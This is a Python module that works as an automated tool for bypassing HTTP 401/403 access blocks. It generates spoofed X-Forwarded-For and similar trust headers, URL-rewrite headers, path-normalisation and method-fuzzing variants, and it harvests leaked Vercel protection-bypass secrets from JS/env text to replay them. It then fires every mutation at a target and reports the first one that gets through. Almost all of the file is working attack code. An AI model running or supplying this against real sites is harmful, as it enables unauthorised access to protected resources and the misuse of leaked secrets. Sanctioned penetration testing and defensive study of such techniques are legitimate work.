"""
Autonomous 401/403 bypass engine — get past access blocks systematically.

Researched from the practitioner + tool consensus (nomore403, XFFenum, Vidoc/PortSwigger
403 guides, Vercel firewall docs). It tries the mutation families that flip a 401/403 to
a real 2xx, and detects success by DIFFING against the baseline blocked response (a
mutation "works" only when the status improves AND the body materially changes — not just
a different error page).

Mutation families (pure builders, unit-tested):
  * **Header injection** — X-Forwarded-For / X-Real-IP / X-Original-URL / X-Rewrite-URL /
    Host-override / Forwarded, with 127.0.0.1 / localhost / private-IP values (defeats
    IP-allowlist and reverse-proxy path ACLs).
  * **Path normalization** — /..;/  //  /./  /%2e/  trailing /  ;  .json  %20 %09  case
    (defeats naive string-based path blocks, esp. nginx).
  * **Method fuzzing** — POST/PUT/PATCH/HEAD/OPTIONS/TRACE (auth that only gates GET).
  * **Vercel bypass** — the `x-vercel-protection-bypass` secret (header or ?query) which
    skips Vercel deployment-protection + bot-protection + system mitigations. The secret
    (VERCEL_AUTOMATION_BYPASS_SECRET) leaks into JS/env; harvest it and replay it.

SCOPE (honest): these defeat APP-LEVEL 403s (nginx/path ACL, IP allowlist, Vercel
deployment protection). They do NOT defeat true edge bot-detection (Cloudflare/Akamai
JS-challenge) — that needs the browser-render / TLS-impersonation / origin-pivot paths
(syber.waf, browser_recon). This engine is the missing systematic layer for the former.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Callable
from urllib.parse import urlparse, urlunparse

__all__ = ["header_mutations", "path_mutations", "method_mutations",
           "vercel_bypass_secret", "Bypass403Result", "run_bypass403", "MutationResult"]

# IP-trust headers + values that reverse proxies / apps commonly (mis)trust.
_TRUST_HEADERS = ["X-Forwarded-For", "X-Real-IP", "X-Remote-IP", "X-Remote-Addr",
                  "X-Client-IP", "X-Originating-IP", "X-Forwarded-Host", "X-Host",
                  "X-Custom-IP-Authorization", "Client-IP", "True-Client-IP",
                  "Cluster-Client-IP", "X-ProxyUser-Ip"]
_TRUST_VALUES = ["127.0.0.1", "localhost", "127.0.0.1:443", "127.0.0.1:80",
                 "10.0.0.1", "172.16.0.1", "192.168.1.1", "0.0.0.0", "::1"]
# Path-rewrite headers: the proxy allows /, the app routes to the blocked path.
_REWRITE_HEADERS = ["X-Original-URL", "X-Rewrite-URL", "X-Override-URL"]
_METHODS = ["POST", "PUT", "PATCH", "HEAD", "OPTIONS", "TRACE", "GET"]

_VERCEL_SECRET_RX = re.compile(
    r"(?:x-vercel-protection-bypass|vercel[_-]?automation[_-]?bypass[_-]?secret)"
    r"['\"]?\s*[:=]\s*['\"]?([A-Za-z0-9]{20,})", re.IGNORECASE)


@dataclass
class MutationResult:
    kind: str                    # header | path | method | vercel
    label: str                   # human description of the mutation
    url: str
    method: str = "GET"
    headers: dict[str, str] = field(default_factory=dict)


# --------------------------------------------------------------------------- #
# Pure mutation builders (no network)
# --------------------------------------------------------------------------- #
def header_mutations(url: str) -> list[MutationResult]:
    out: list[MutationResult] = []
    for h in _TRUST_HEADERS:
        for v in _TRUST_VALUES:
            out.append(MutationResult("header", f"{h}: {v}", url, headers={h: v}))
    # path-rewrite headers: request "/" but ask the app to route to the blocked path
    pu = urlparse(url)
    root = urlunparse(pu._replace(path="/", query="", fragment=""))
    for h in _REWRITE_HEADERS:
        out.append(MutationResult("header", f"root + {h}: {pu.path or '/'}", root,
                                  headers={h: pu.path or "/"}))
    return out


def path_mutations(url: str) -> list[MutationResult]:
    pu = urlparse(url)
    path = pu.path or "/"
    variants: list[str] = []
    p = path.rstrip("/")
    seg = p.rsplit("/", 1)[-1] if "/" in p else p
    base = p[: -len(seg)] if seg else p
    # classic nginx/apache normalization tricks
    for v in (f"{p}/", f"{p}/.", f"{p}//", f"//{p.lstrip('/')}", f"{p}/..;/",
              f"{base}{seg}..;/", f"{p}%20", f"{p}%09", f"{p}%2e", f"{p}?",
              f"{p}#", f"{p}.json", f"{p};", f"{p}/~", f"/./{p.lstrip('/')}",
              f"/%2e/{p.lstrip('/')}", f"{base}%2e/{seg}"):
        variants.append(v)
    # case toggle of the last segment
    if seg and seg.lower() != seg.upper():
        variants.append(f"{base}{seg.upper()}")
        variants.append(f"{base}{seg.capitalize()}")
    out: list[MutationResult] = []
    seen = set()
    for v in variants:
        u = urlunparse(pu._replace(path=v))
        if u not in seen:
            seen.add(u)
            out.append(MutationResult("path", f"path -> {v}", u))
    return out


def method_mutations(url: str) -> list[MutationResult]:
    return [MutationResult("method", f"method {m}", url, method=m) for m in _METHODS if m != "GET"]


def vercel_bypass_secret(text: str | None) -> str | None:
    """Extract a Vercel protection-bypass secret from JS/env/config text."""
    if not text:
        return None
    m = _VERCEL_SECRET_RX.search(text)
    return m.group(1) if m else None


def vercel_mutations(url: str, secret: str) -> list[MutationResult]:
    """Replay the Vercel bypass secret as a header AND as a query param."""
    pu = urlparse(url)
    q = (pu.query + "&" if pu.query else "") + f"x-vercel-protection-bypass={secret}"
    return [
        MutationResult("vercel", "x-vercel-protection-bypass header", url,
                       headers={"x-vercel-protection-bypass": secret,
                                "x-vercel-set-bypass-cookie": "true"}),
        MutationResult("vercel", "x-vercel-protection-bypass query", urlunparse(pu._replace(query=q))),
    ]


def looks_vercel(headers: dict[str, str] | None) -> bool:
    h = {k.lower(): str(v).lower() for k, v in (headers or {}).items()}
    return h.get("server") == "vercel" or any(k.startswith("x-vercel") for k in h)


# --------------------------------------------------------------------------- #
# Live runner (diff vs baseline)
# --------------------------------------------------------------------------- #
@dataclass
class Bypass403Result:
    url: str
    baseline_status: int | None = None
    bypassed: bool = False
    winner: dict[str, Any] | None = None      # the mutation that worked
    tried: int = 0

    def to_dict(self) -> dict[str, Any]:
        return {"url": self.url, "baseline_status": self.baseline_status,
                "bypassed": self.bypassed, "winner": self.winner, "tried": self.tried,
                "summary": (f"BYPASSED {self.baseline_status}→{self.winner['status']} via "
                            f"{self.winner['label']}" if self.bypassed and self.winner
                            else f"no bypass ({self.tried} mutations tried)")}


def _improved(baseline_status: int | None, status: int | None, base_len: int, new_len: int) -> bool:
    """A mutation succeeds only if the status improves to 2xx/3xx AND the body materially
    differs from the baseline block page (avoids counting a different 403 page as a win)."""
    try:
        s = int(status)
    except (TypeError, ValueError):
        return False
    if not (200 <= s < 400):
        return False
    if baseline_status is not None and 200 <= int(baseline_status) < 400:
        return False                       # wasn't actually blocked
    # body must change materially (a 200 with the same block-page length is not a real win)
    return abs(new_len - base_len) > max(64, int(base_len * 0.10)) or base_len == 0


def run_bypass403(url: str, fetch: Callable[..., dict[str, Any]],
                  harvested_text: str = "", max_mutations: int = 120) -> Bypass403Result:
    """Try every mutation family against `url` via `fetch(url, method=, headers=)` (inject
    the platform's real browser/HTTP transport). Returns the first mutation that flips the
    block to real content. `harvested_text` = any JS/env text to mine a Vercel secret from."""
    res = Bypass403Result(url=url)
    base = fetch(url, method="GET", headers={})
    res.baseline_status = base.get("status")
    base_len = len(base.get("body", "") or "")
    base_headers = base.get("headers", {})

    muts: list[MutationResult] = []
    # Vercel first (highest-yield when applicable)
    secret = vercel_bypass_secret(harvested_text)
    if secret and (looks_vercel(base_headers) or True):
        muts += vercel_mutations(url, secret)
    muts += method_mutations(url) + header_mutations(url) + path_mutations(url)

    for m in muts[:max_mutations]:
        res.tried += 1
        try:
            r = fetch(m.url, method=m.method, headers=m.headers)
        except Exception:  # noqa: BLE001
            continue
        if _improved(res.baseline_status, r.get("status"), base_len, len(r.get("body", "") or "")):
            res.bypassed = True
            res.winner = {"kind": m.kind, "label": m.label, "url": m.url, "method": m.method,
                          "headers": m.headers, "status": r.get("status")}
            return res
    return res
